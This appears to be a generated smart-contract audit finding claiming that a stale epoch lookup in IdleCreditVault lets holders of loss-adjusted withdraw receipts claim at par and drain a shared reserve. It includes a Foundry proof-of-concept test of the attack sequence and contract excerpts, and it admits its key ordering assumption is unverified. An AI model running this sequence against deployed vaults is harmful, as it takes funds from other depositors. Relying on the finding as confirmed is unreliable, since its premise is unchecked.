### Title
Loss-adjusted withdraw receipts escape the haircut and are paid at par via stale `lastWithdrawRequest` epoch lookup - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
The external report is a use-after-free: a stale pointer/index is reused after the object it refers to has changed. The closest analog in this codebase is `IdleCreditVault`'s use of the single-slot `lastWithdrawRequest[_user]` as the lookup key into `lossRecoveryPriceByEpoch`. When a `stopEpochWithDuration` loss is realized, `collectWithdrawFunds` stores the haircut under `epochNumber` *after* `stopEpoch` has already incremented it, while the user's receipt was recorded under the pre-increment epoch. The loss-adjusted claim path then misses, the funded claim path pays the full un-haircut basis, and the haircut escapes onto other claimants.

### Finding Description
`requestWithdraw` stores the request epoch as `lastWithdrawRequest[_user] = currentEpoch` (the epoch in which the request was made) [1](#0-0) . `epochNumber` is increased at `stopEpoch` (see comment at line 322-326), and `collectWithdrawFunds` records the realized-loss recovery price under `lossRecoveryPriceByEpoch[epochNumber]` using the post-increment value [2](#0-1) .

On claim, `_claimLossAdjustedWithdrawRequest` reads `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]` [3](#0-2) . Because the loss was stored under `lastWithdrawRequest + 1`, this returns 0 and the function exits early. Execution falls through to `_claimFundedWithdrawRequest`, which passes its gate (`epochNumber > lastWithdrawRequest` holds since the epoch ended) and pays `withdrawsRequests[_user]` — the **full, un-haircut basis** — out of the strategy [4](#0-3) .

Only `pendingBasis - pendingLoss` underlyings were transferred in by `collectWithdrawFunds`, but every pending receipt claims its full basis. The same stale-key issue also defeats the `requestWithdraw` guard at lines 263-271, which checks `lossRecoveryPriceByEpoch[lastWithdrawRequest]` to force claiming a loss-adjusted receipt before opening a new one — it reads the wrong epoch too.

### Impact Explanation
The borrower funds `pendingBasis * lossRecoveryPrice / RECOVERY_FULL`, but each receipt holder withdraws their full `withdrawsRequests` basis at par via `_transferFundedClaim`. First claimants drain the funded reserve; the deficit is socialized onto later loss-adjusted claimants and/or other vault-funded balances (instant-withdraw reserves, donated/dust reserves). Concretely, with a 50% recovery price the first claimants extract up to ~2× their funded share, breaking the loss-waterfall and one-receipt-one-payout invariants, and leaving insolvency for the remaining receipts — a direct fund loss, not a DoS.

### Likelihood Explanation
Requires only an unprivileged tranche holder who calls `requestWithdraw` during an epoch that later ends via `stopEpochWithDuration(_lossAmount)` with a partial fill (`_amount < pendingBasis`) — i.e., a realized-loss epoch, the exact scenario this code path was built for. The attacker races to claim before other pending-receipt holders. No privileged role is needed; the sequence is entirely user-driven around honest manager `stopEpoch` calls. The one caveat I could not fully verify within available context: the exact ordering of the `epochNumber` increment relative to the `collectWithdrawFunds` call inside `IdleCDOEpochVariant.stopEpochWithDuration`. If the CDO collects funds before incrementing `epochNumber`, the key matches and the bug does not trigger; the claim-side comment ("epoch number is increased at stopEpoch") and the funded-claim gate (`epochNumber <= lastWithdrawRequest` reverts) strongly imply the increment precedes collection.

### Recommendation
Store the loss recovery price under the epoch in which the receipts were requested, or make the claim path epoch-agnostic. Concretely: in `collectWithdrawFunds`, persist the pre-increment request epoch (e.g., pass it from the CDO or record `epochNumber - 1`), or replace the `lastWithdrawRequest`-keyed lookup in `_claimLossAdjustedWithdrawRequest` with a check against the epoch that `collectWithdrawFunds` actually recorded, so every pending receipt created before the loss is forced through the haircut path regardless of when `epochNumber` was bumped.

### Proof of Concept
Foundry fork sketch (against the `IdleCDOEpochVariant` + `IdleCreditVault` harness used in `test/foundry/IdleCreditVault.t.sol`):

```solidity
function testLossReceiptEscapesHaircut() external {
    // setup: deposit AA for user1 (attacker) and user2 (victim)
    uint256 amount = 100_000 * ONE_SCALE;
    _depositWithUser(user1, amount, true);
    _depositWithUser(user2, amount, true);

    _startEpochAndCheckPrices(0);
    // stop epoch 0 normally; epochNumber becomes 1
    vm.warp(cdoEpoch.epochEndDate() + 1);
    deal(defaultUnderlying, borrower, cdoEpoch.expectedEpochInterest());
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    // both users request withdraw during epoch 1 -> lastWithdrawRequest = 1
    vm.prank(user1);
    cdoEpoch.requestWithdraw(IERC20(AAtranche).balanceOf(user1), address(AAtranche));
    vm.prank(user2);
    cdoEpoch.requestWithdraw(IERC20(AAtranche).balanceOf(user2), address(AAtranche));

    _startEpochAndCheckPrices(1);

    // borrower can only repay half: realized loss on pending receipts
    uint256 pending = IdleCreditVault(address(strategy)).pendingWithdraws();
    vm.warp(cdoEpoch.epochEndDate() + 1);
    deal(defaultUnderlying, borrower, pending / 2);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(0, pending / 2); // loss path -> collectWithdrawFunds(half)
    // lossRecoveryPriceByEpoch stored under epochNumber == 2, but lastWithdrawRequest == 1

    // attacker claims FIRST: loss-adjusted path misses (price[1] == 0),
    // funded path pays FULL basis instead of half
    uint256 balPre = underlying.balanceOf(user1);
    vm.prank(user1);
    cdoEpoch.claimWithdrawRequest();
    uint256 attackerOut = underlying.balanceOf(user1) - balPre;

    // attacker received ~par while only ~50% was funded for all receipts
    assertGt(attackerOut, pending / 4 + 1); // > his funded share
    // victim's subsequent claim reverts on transfer or is short -> insolvency
}
```

The assertion that decides validity is `lossRecoveryPriceByEpoch[strategy.lastWithdrawRequest(user1)] == 0` after the loss stop while `strategy.pendingWithdraws()` was cleared by the underfunded `collectWithdrawFunds` — confirming the haircut is keyed to an epoch the claim path never reads.

  function _claimFundedWithdrawRequest(address _user) internal returns (uint256 amount) {
    // User should wait at least an epoch before claiming the withdraw. Once the epoch is over user can withdraw 
    // at any time even if a new epoch started. 
    // So if epochNumber is the same as the last withdraw request then we revert. Epoch number is increased at stopEpoch
    // NOTE: If a user does not claim a withdraw request and instead requests another withdraw, he will have to wait
    // for another epoch to claim both requests.
    // NOTE 2: if borrower defaults, old withdraw requests can still be claimed
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
    // settle APR=0 requests once the related epoch has ended
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    // Claim includes:
    // - settled APR0 principal from finalized epochs
    // - still-open APR0 principal: if pool-close mode was used (_interest == 1), IdleCDO sets
    //   epochEndDate = 0 and claims can be immediate, while _settleApr0 can still skip settlement
    //   for the current request epoch (reqEpoch >= epochNumber).
    // - settled APR0 interest
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);

  function collectWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    uint256 pendingBasis = pendingWithdraws;
    if (_amount < pendingBasis) {
      // Legacy receipts do not have per-epoch ownership data, so they can only be fully funded.
      if (!defaultRecoveryInitialized) revert NotAllowed();
      uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
      // Avoid storing a zero price, which is indistinguishable from "no loss-adjusted epoch".
      if (lossRecoveryPrice == 0) revert NotAllowed();
      pendingWithdraws = 0;
      lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
    } else {
      // A plain implementation upgrade may leave legacy normal receipts pending. Their next
      // successful stop can fully fund the aggregate before lazy initialization occurs.
      pendingWithdraws = pendingBasis - _amount;
    }

  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
  }
